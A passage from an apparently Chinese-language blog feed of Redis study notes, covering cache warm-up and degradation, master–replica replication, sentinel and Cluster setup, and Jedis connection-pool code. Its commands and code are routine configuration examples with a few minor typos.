title="缓存预热"></a>缓存预热</h2><p>即系统上线后，先将<code>相关的数据构建到缓存中</code>，这样就可以避免用户请求的时候直接查库。</p><p>这部分预热的数据主要取决于<code>访问量</code>和<code>数据量大小</code>。如果数据的访问量不大的话，那么就没必要做预热，都没什么多少请求了，直接按正常的缓存读取流程执行就好。</p><p>访问量大的话，也要看数据的大小来做预热措施。</p><ol><li>数据量不大的时候，系统启动的时候<code>进行加载缓存</code>动作，这种数据一般可以是电商首页的运营位之类的信息；</li><li>数据量大的时候，设置一个<code>定时任务脚本</code>，进行<code>缓存的刷新</code>；</li><li>数据量太大的时候，优先保证热点数据进行<code>提前加载到缓存</code>，并且确保访问期间不能更改缓存，比如用定时器在秒杀活动前30分钟就把商品信息之类的刷新到缓存，同时规定后台运营人员不能在秒杀期间更改商品属性。</li></ol><h2 id="缓存降级"><a href="#缓存降级" class="headerlink" title="缓存降级"></a>缓存降级</h2><p>即<code>缓存失效</code>或<code>缓存服务器挂掉</code>的情况下，<code>不去访问数据库</code>，直接返回默认数据或访问服务的内存数据。</p><p>在项目实战中通常会将部分热点数据缓存到服务的内存中，类似 <code>HashMap</code>、<code>Guava</code> 这样的工具，一旦缓存出现异常，可以直接使用服务的内存数据，从而避免数据库遭受巨大压力。</p><p>当然，这样的操作对于业务是<code>有损害</code>的，<code>分布式系统</code>中很容易出现<code>数据不一致问题</code>。</p><p>所以，一般这种情况下，我们都优先保证从<code>运维角度</code>确保缓存服务器的<code>高可用性</code>。比如 Redis 的部署采用集群方式，同时做好备份。总之，尽量避免出现降级的影响。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（2）</title>
      <link href="/posts/1bb24f34/"/>
      <url>/posts/1bb24f34/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note orange icon flat"><i class="note-icon fas fa-bullhorn"></i><p>前方多图提醒，请耐心等待加载或刷新页面，已参考多种资料，作图不易，且看且珍惜。（快累趴了）</p></div><h1 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>主从复制</code>，主机数据更新后根据配置和策略，自动同步道备机的<code>master/slaver机制</code>，<code>Master以写为主</code>，<code>Slave以读为主</code>。</p><p>其作用有以下几点：</p><ul><li>读写分离：主服务器负责写，各从服务器负责读，即主机写，从机读</li><li>容灾快速恢复：主从多台服务器进行持久化操作，任意一台服务器宕机也不会影响数据恢复，有效避免了单点故障问题，使数据持久化更加安全</li><li>其他：主从复制是实现哨兵模式和Redis集群的前提</li></ul><h2 id="实现主从复制"><a href="#实现主从复制" class="headerlink" title="实现主从复制"></a>实现主从复制</h2><p>每一台<code>Redis</code>服务器启动时，默认都为主服务器（master）,可通过命令<code>info replcation</code>查看</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/1.5foiw2sgbgo0.jpg" alt="1"></p><ol><li><p>配置文件修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /myredis                # 创建文件夹存储配置文件</span><br><span class="line">cd /myredis# 进入文件夹</span><br><span class="line">cp /etc/redis.conf /myredis/redis.conf# 复制原配置文件，以便操作</span><br></pre></td></tr></table></figure><p>创建<code>reids6379.conf</code>、<code>reids6380.conf</code>、<code>reids6381.conf</code>文件，在文件中填入以下信息</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.<span class="keyword">conf</span></span><br><span class="line">pidfile /var/run/redis_端口号.pid</span><br><span class="line">port （端口号）</span><br><span class="line">dbfilename dump（端口号）.rdb</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/2.6wgs4wui72w0.jpg" alt="2"></p></li><li><p>启动redis服务器</p><p>新建窗口通过<code>redis-cli -p 端口号</code>进入各自的客户端</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/3.36sncsb6o840.jpg" alt="3"></p></li><li><p>使用命令实现主从关系（配从不配主）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>详情如下图所示</p><p>从节点：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/从节点.31rkn6xum640.jpg" alt="从节点"></p><p>主节点：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/主节点.124i7i3mtvg0.jpg" alt="主节点"></p></li><li><p>主从关系实现后，验证是否实现数据复制</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/数据复制.3458jbrjayg0.jpg" alt="数据复制"></p></li></ol><h2 id="主从复制原理"><a href="#主从复制原理" class="headerlink" title="主从复制原理"></a>主从复制原理</h2><p>在Redis2.8之前同步方式都以<code>全量方式</code>同步，但之后为了提高效率，数据复制方式分为两种：<code>全量复制</code>和<code>部分复制</code>。</p><ul><li>全量复制：将主服务器中的数据，全部同步到从服务器中，一般是在从服务器启动初始化数据的时候进行全量同步</li><li>部分复制：将未同步的增量数据，同步到从服务器，无需再全部复制一遍，一般用于因网络中断等无法同步数据的情况下，待恢复正常之后，将中断期间的数据进行部分同步</li></ul><h3 id="全量复制图解"><a href="#全量复制图解" class="headerlink" title="全量复制图解"></a>全量复制图解</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/全量复制.40tonu0t4to0.png" alt="全量复制" style="zoom: 50%;" /></p><p>解释说明：</p><p>1、从节点断开连接后，发送同步请求<code>psync</code>尝试建立连接</p><p>2、主节点向从节点发送信息，获取<code>runid</code>和<code>offset</code></p><p>3、主节点fork子进程将全部数据生成<code>RDB文件</code></p><p>4、主节点期间接收到的<code>write</code>命令存入到复制缓冲区</p><p>5、当主节点<code>RDB文件</code>完成后发送给从节点</p><p>6、从节点接受<code>RDB文件</code>后，清空旧数据，加载RDB数据到内存中（即直接将其作为数据文件）</p><p>7、主节点发送缓冲区内的数据到从节点</p><p>8、从节点接受复制缓冲区命令并执行，最后同步到最新数据中</p><h3 id="部分复制图解"><a href="#部分复制图解" class="headerlink" title="部分复制图解"></a>部分复制图解</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/部分复制.6cn0kqkut9o0.png" alt="部分复制" style="zoom:50%;" /></p><p>解释说明：</p><p>1、当主从服务器之间由于网络中断后，从节点会尝试连接主节点</p><p>2、重连期间主节点接收到的<code>write</code>命令会存入到复制缓冲区</p><p>3、当网络恢复后，从节点成功连接主节点，由于之前从节点保存了主节点的<code>runid</code> 和<code>offset</code>，所以只需要发送命令 <code>psync &#123;runid&#125; &#123;offset&#125;</code>即可</p><p>4、主节点接收到从节点的请求，会先验证请求的<code>runid</code>是否和自身的的 <code>runid</code>匹配，不匹配则进行<code>全量复制</code>，其后查看请求的<code>offset</code>在自身复制缓冲区查找，如果偏移量之后的数据存在缓冲区中，则对从节点发送<code>+CONTINUE</code> 响应，表示可以进行部分复制。</p><p>5、当从节点传递过来的runid和offset验证通过时，则进行部分复制，并记录新的<code>offset</code></p><div class="note info flat"><p>PS：当主机宕机时，主从关系仍存在，各从机中的主机信息不会发生改变，主机重启后，其从机信息与宕机前的一致</p></div><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><h3 id="一、-薪火相传"><a href="#一、-薪火相传" class="headerlink" title="一、    薪火相传"></a><strong>一、    薪火相传</strong></h3><p>有三个节点ABC，A为主机，B为A的从机，C为B的从机。</p><ol><li>主机A无法对C进行主从复制</li><li>当主机A存活时，B、C都不可写数据，只能读数据</li><li>主机A宕机后，B、C仍不可写数据，直到B使用<code>slaveof no one</code>命令后，即下面所讲的<code>反客为主</code>模式，B可以写数据，C可以读取B写的数据</li></ol><p><strong>官方概述</strong>：上一个<code>slave</code>（从机）可以是下一个<code>slave</code>（从机）的<code>master</code>（主机），<code>slave</code>同样可以接收其他slaves的连接和同步请求，那么该<code>slave</code>作为了链条中下一个的<code>master</code>，可以有效减轻<code>master</code>的写压力。</p><p><strong>风险</strong>：一旦某个从机宕机，后面的从机都无法备份。</p><p><strong>中途变更转向</strong>：会清除之前的数据，重新建立拷贝最新的。</p><h3 id="二、-反客为主"><a href="#二、-反客为主" class="headerlink" title="二、    反客为主"></a><strong>二、    反客为主</strong></h3><p>当一个<code>master</code>宕机后，后面的<code>slave</code>通过命令可以立刻升为<code>master</code>，其后面的<code>slave</code>不用做任何修改，但不用修改的前提在于<code>从机</code>实现了薪火相传模式，否则仍需进行主从关系确认。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one# 将从机变为主机</span><br></pre></td></tr></table></figure><p>当宕机后的<code>master</code>重启后，此时已无任何主从关系，无任何复制关系。</p><h3 id="三、-哨兵模式"><a href="#三、-哨兵模式" class="headerlink" title="三、    哨兵模式"></a><strong>三、    哨兵模式</strong></h3><p>哨兵模式，俗称<font color="red">反客为主的自动版</font>，能够后台监控主机是否故障，若故障了则根据<code>投票数</code>自动<code>将从库转换为主库</code>，保证了系统的可用性。</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li>监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运行正常</li><li>自动故障转移（Automatic faliover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点</li><li>配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址</li><li>通知（Notification）：哨兵可以将故障转移的结果发送给客户端</li></ul><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li><p>调整为<code>一主二仆模式</code>，<code>6379</code>带着<code>6380</code>、<code>6381</code></p></li><li><p>在自定义的<code>/myredis</code>目录下新建<code>sentinel.conf</code>，切记文件名不能有错</p></li><li><p>配置哨兵</p><p>在<code>sentinel.conf</code>文件中填入配置信息，保存退出</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">6379</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>注：<code>mymaster</code>为监控对象起的服务器名称（即哨兵名称），<code>1</code>为至少有多少个哨兵同意迁移的数量</p></li><li><p>启动哨兵</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-sentinel /myredis/sentinel.conf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/哨兵启动.6svp11zonng0.jpg" alt="启动哨兵"></p></li><li><p>当主节点6379宕机后，等待30秒，哨兵进行投票推选新主节点</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/哨兵票选.5xpehoup20s0.jpg" alt="哨兵票选"></p></li><li><p>当主节点6379重新连接后，哨兵服务端响应两句</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/原主机上线.18mr2583aghs.jpg" alt="原主机上线"></p><p>第一句是：去除6379的下线处理</p><p>第二句是：重连6379到新的主节点上，此时6379为新主节点的从节点</p></li><li><p>检验主从复制是否正常工作</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/检验主从复制.62himtzsuys0.jpg" alt="检验主从复制"></p><p>上图所见，主从复制正常运行，至此，哨兵模式的配置完成</p></li></ol><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：<code>高可用</code>，<code>读写分离</code>，哨兵模式是基于主从模式的，主从模式的优点，哨兵模式都具备，主从可以自动切换，系统更健壮，可用性更高。</p><p>缺点：Redis比较难支持在线扩容，在集群容量达到上线时在线扩容会变得非常复杂。</p><h1 id="Redis集群"><a href="#Redis集群" class="headerlink" title="Redis集群"></a>Redis集群</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>所谓的集群，就是通过添加服务器的数量，提供相同的服务，从而让服务器达到一个稳定、高效的状态，集群主要解决<code>容量不够</code>和<code>并发写操作压力</code>等问题。</p><p>Redis3.0版本之前只支持单例（代理主机），在3.0版本即以后的版本才支持集群，采用<code>无中心化集群</code>配置。</p><p>Redis集群，是基于Redis主从复制实现的，同时也存在三种模式：<code>主从模式</code>、<code>哨兵模式</code>和<code>Cluster集群模式</code>。</p><p>由于前两种模式在前面<code>主从复制</code>环节中有讲解，所以我们这里重点关注<code>Cluster模式</code>。</p><h2 id="Cluster集群模式"><a href="#Cluster集群模式" class="headerlink" title="Cluster集群模式"></a>Cluster集群模式</h2><ul><li>之前的<code>哨兵模式</code>基本已经可以实现高可用、读写分离，但是在这种模式每台redis服务器都存储相同的数据，很<code>浪费内存资源</code>，所以在Redis3.0上加入了<code>Cluster集群模式</code>，实现了Redis的<code>分布式存储</code>，也就是说每台Redis节点存储着不同的内容</li><li>根据官方推荐，集群部署至少要<code>3台以上</code>的master节点，最好使用<code>3主3从</code>六个节点的模式</li><li>Cluster集群由多个redis服务器组成的<code>分布式网络服务集群</code>，集群之中有多个master主节点，每一个主节点都可读可写，节点之间会相互通信，两两相连，redis集群无中心节点</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/无中心化集群.2s6cwtc8k6g0.png" alt="无中心化集群"></p><ul><li>在<code>redis-Cluster集群</code>中，可以给每个主节点添加从节点，主节点和从节点直接遵循主从模型的特性，当用户需要处理更多读请求的时候，添加从节点可以扩展系统的读性能</li><li><code>redis-cluster</code>的<code>故障转移</code>：redis集群的主机节点内置了类似redis sentinel的<code>节点故障检测</code>和<code>自动故障转移</code>功能，当集群中的某个主节点下线时，集群中的其他在线主节点会注意到这一点，并且对已经下线的主节点进行故障转移</li><li>集群进行故障转移的方法和<code>redis sentinel</code>进行故障转移的方法基本一样，不同的是，在集群里面，故障转移是由集群中其他在线的主节点负责进行的，所以集群不必另外使用<code>redis sentinel</code></li></ul><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>删除持久化数据（rdb/aof文件）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /myredis# 进入自定义目录</span><br><span class="line">rm -rf rdb*# 删除rdb文件，如若有aof文件，也一并删除</span><br></pre></td></tr></table></figure></li><li><p>实例准备</p><p>Master端口：6379、6380、6381</p><p>Slave端口：6389、6390、6391</p><div class="note warning flat"><p>分配原则尽量保证每个主数据库运行在不同的IP地址，每个从库和主库不在一个IP地址上。</p></div><p>配置文件<code>redis6379.conf</code></p><p>删除之前的哨兵数据，添加下面的集群配置，保存退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster-enabled yes# 打开集群模式</span><br><span class="line">cluster-config-file nodes-6379.conf# 设定节点配置文件</span><br><span class="line">cluster-node-timeout 15000# 集群节点的超时时限默认值</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/集群配置删除.aamudg5l9f4.jpg" alt="集群配置删除"></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/集群配置添加.4c4xk3rl6qi0.jpg" alt="集群配置添加"></p><p>删除原来的<code>redis6380.conf</code>和<code>redis6381.conf</code>文件，另外<code>拷贝5份</code>修改的<code>redis6379.conf</code>为对应端口号文件</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/拷贝文件.185f6wfoq2yo.jpg" alt="拷贝文件"></p><p>进入vim编辑器，在命令模式下使用<code>:%s/6379/替换后端口</code>快速修改5份拷贝后的配置文件信息</p></li><li><p>启动6个redis服务</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/启动服务.22uohujnmgcg.jpg" alt="启动服务"></p></li><li><p>组合集群</p><p>组合之前，确保所有redis服务启动后，<code>nodes-端口号.conf</code>文件都生成正常</p><p>如果你是redis5.0及之后的，无需安装ruby依赖，redis安装目录里内置了集群命令行工具redis-trib ，它是一个 Ruby 程序， 这个程序通过向实例发送特殊命令来完成创建新集群， 检查群， 或者对集群进行重新分片工作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --cluster create 192.168.30.0:6379 192.168.30.0:6380 192.168.30.0:6381 192.168.30.0:6389 192.168.30.0:6390 192.168.30.0:6391 --cluster-replicas 1# 组合命令</span><br></pre></td></tr></table></figure> <div class="note info no-icon flat"><p>ps：<code>--cluster-replicas 1</code> 这个指的是从机的数量，表示我们希望为集群中的每个主节点创建一个从节点。另外，主从是随机绑定的，创建完成后可以在master节点中看到所有节点状态（netstat -natp | grep 6379）</p></div><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/组合集群.5p63gwu2zhk0.jpg" alt="组合集群"></p></li><li><p>测试集群</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -c -p 端口号    # -c参数实现自动重定向，连接客户端</span><br><span class="line">cluster info    # 查看集群状态</span><br><span class="line">cluster nodes    # 查看节点信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/测试集群.h1u9gsuk0nc.jpg" alt="测试集群"></p><p>如图所示，集群搭建成功。</p> <div class="note info no-icon flat"><p>Redis 集群有<code>16384</code>个<code>哈希槽</code>，每个<code>key</code>通过<code>CRC16</code>校验后对16384取模来决定放置哪个槽。集群的每个节点负责一部分hash槽，举个例子，比如当前集群有3个节点ABC，那么：</p><ul><li>节点 A 包含 <code>0</code> 到 <code>5460</code>号哈希槽</li><li>节点 B 包含<code>5461</code> 到 <code>10922</code> 号哈希槽</li><li>节点 C 包含<code>10923</code> 到 <code>16383</code>号哈希槽</li></ul></div><p>尝试往集群中写入数据</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/写入数据.5rjk9tsc1xs0.jpg" alt="写入数据"></p><p>不在一个<code>slot</code>下的键值，是不能使用<code>mget、mset等多键操作</code>，但可通过<code>&#123;&#125;</code>内相同内容的键值对放到同一个<code>slot</code>中去</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/多键操作.3ukznasnqym0.jpg" alt="多键操作"></p><p>查询集群中的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster keyslot &lt;key&gt;                # 计算key的插槽值</span><br><span class="line">cluster countkeysinslot &lt;slot&gt;        # 返回slot槽的键数(只能查看自己插槽范围内的值)</span><br><span class="line">cluster getkeysinslot &lt;slot&gt; &lt;count&gt;# 返回count个slot槽中的键</span><br></pre></td></tr></table></figure></li><li><p>集群的Jedis开发</p><p>无中心化主从集群。即使连接的不是主机，集群会自动切换主机存储。遵循<code>主写从读</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- jedis依赖包引入  --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisClusterTest</span></span>&#123;</span><br><span class="line">    <span class="function">publi <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">         Set&lt;HostAndPort&gt; set = <span class="keyword">new</span> HashSet&lt;HostAndPort&gt;();</span><br><span class="line">         set.add(<span class="keyword">new</span> HashSet&lt;HostAndPort&gt;(<span class="string">&quot;192.168.30.0&quot;</span>,<span class="number">6379</span>));</span><br><span class="line">         JedisCluster jc = <span class="keyword">new</span> JedisCluster(set);</span><br><span class="line">         jc.set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">         String value = jc.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">         System.out.println(value);</span><br><span class="line">         jc.close();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="集群优缺点"><a href="#集群优缺点" class="headerlink" title="集群优缺点"></a>集群优缺点</h3><p>优点：实现扩容、分摊压力、无中心配置相对简单</p><p>缺点：多键操作、多键的Redis事务、lua脚本均不被支持</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring boot整合Redis</title>
      <link href="/posts/b921ad40/"/>
      <url>/posts/b921ad40/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Jedis、Spring-data-redis的配置以及区别"><a href="#Jedis、Spring-data-redis的配置以及区别" class="headerlink" title="Jedis、Spring-data-redis的配置以及区别"></a>Jedis、Spring-data-redis的配置以及区别</h1><h2 id="Jedis如何配置"><a href="#Jedis如何配置" class="headerlink" title="Jedis如何配置"></a>Jedis如何配置</h2><ol><li>jedis引入依赖<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        Jedis引入依赖--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li><p>连接Redis客户端</p><ol><li><p>Jedis直连</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;192.168.30.0&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">jedis.set(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">String value = jedis.get(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JedisPool 连接池的使用</p><p>配置文件<code>jedis.properties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 资源池最大连接数</span><br><span class="line">maxTotal=<span class="number">50</span>             </span><br><span class="line"># 资源池允许最大空闲连接数</span><br><span class="line">maxIdle=<span class="number">10</span>              </span><br><span class="line"># redis服务器地址</span><br><span class="line">host=<span class="number">192.168</span><span class="number">.30</span><span class="number">.0</span> </span><br><span class="line"># redis开放端口</span><br><span class="line">port=<span class="number">6379</span>             </span><br></pre></td></tr></table></figure><p>类<code>JedisUtils.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPoolConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个连接池</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JedisPool jedisPool;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//读取配置文件</span></span><br><span class="line">        InputStream is = JedisUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;jedis.properties&quot;</span>);</span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pro.load(is);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//连接池配置</span></span><br><span class="line">        JedisPoolConfig config=<span class="keyword">new</span> JedisPoolConfig();</span><br><span class="line">        config.setMaxTotal(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxTotal&quot;</span>)));</span><br><span class="line">        config.setMaxIdle(Integer.parseInt(pro.getProperty(<span class="string">&quot;maxIdle&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化连接池，把对应参数传递进去</span></span><br><span class="line">        jedisPool=<span class="keyword">new</span> JedisPool(config,pro.getProperty(<span class="string">&quot;host&quot;</span>), Integer.parseInt(pro.getProperty(<span class="string">&quot;port&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置好后返回，返回一个Jedis对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Jedis <span class="title">getJedis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jedisPool.getResource();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类<code>JedisTest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取连接池对象</span></span><br><span class="line">            jedis = JedisUtils.getJedis();</span><br><span class="line">            <span class="comment">//执行操作</span></span><br><span class="line">            jedis.set(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;good&quot;</span>);</span><br><span class="line">            System.out.println(jedis.get(<span class="string">&quot;java&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span 